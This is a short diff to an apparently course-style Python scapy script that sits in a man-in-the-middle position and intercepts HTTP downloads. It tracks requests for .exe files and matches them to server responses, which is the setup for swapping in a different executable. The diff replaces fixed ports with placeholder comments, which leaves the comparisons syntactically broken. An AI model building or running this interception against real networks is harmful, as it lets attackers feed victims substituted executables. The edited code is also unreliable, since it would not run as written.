@@ -18,14 +18,14 @@ def process_packet(packet):
     Do not forget to modify line 23 and 34 nad uncomment them afterwards."""
     scapy_packet = scapy.IP (packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 10000:
+        if scapy_packet[scapy.TCP].dport == #CHOOSE PORT HERE: 80 / 10000:
             # print("HTTP Request")
             if ".exe" in scapy_packet[scapy.Raw].load and #Input IP of your web server here: "10.0.2.15" not in scapy_packet[scapy.Raw].load:
                 print("Captured .exe file in the Request packet.")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 # print(scapy_packet.show())
 
-        elif scapy_packet[scapy.TCP].sport == 10000:
+        elif scapy_packet[scapy.TCP].sport ==#CHOOSE PORT HERE: 80 / 10000:
             # print("HTTP Response")
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
